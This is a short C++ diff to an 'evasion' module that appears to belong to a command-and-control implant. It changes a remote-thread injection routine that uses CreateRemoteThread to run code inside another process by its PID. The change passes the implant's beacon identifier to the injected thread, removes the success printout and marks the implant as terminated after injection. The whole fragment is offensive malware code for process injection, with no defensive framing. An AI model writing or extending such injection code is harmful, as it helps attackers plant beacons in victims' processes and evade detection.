@@ -40,6 +40,8 @@ void evasion::inject_remote_thread(int pid) {
         std::cout << "[!] Error: " << GetLastError() << std::endl;
         return;
     }
+
+    // OLD WAY
     
     DWORD threadId = 0;
     HANDLE hThread = CreateRemoteThread(
@@ -47,14 +49,12 @@ void evasion::inject_remote_thread(int pid) {
         NULL,
         0,
         (LPTHREAD_START_ROUTINE)addr,
-        NULL, // here we will mention the beacon ID
+        (VOID*)core::instance->identifier.c_str(), // here we will mention the beacon ID
         0,
         &threadId
     );
 
-    if (hThread) {
-        std::cout << "[+] Injected Thread: " << threadId << std::endl;
-    }
+    core::terminated = true;
 }
 
 
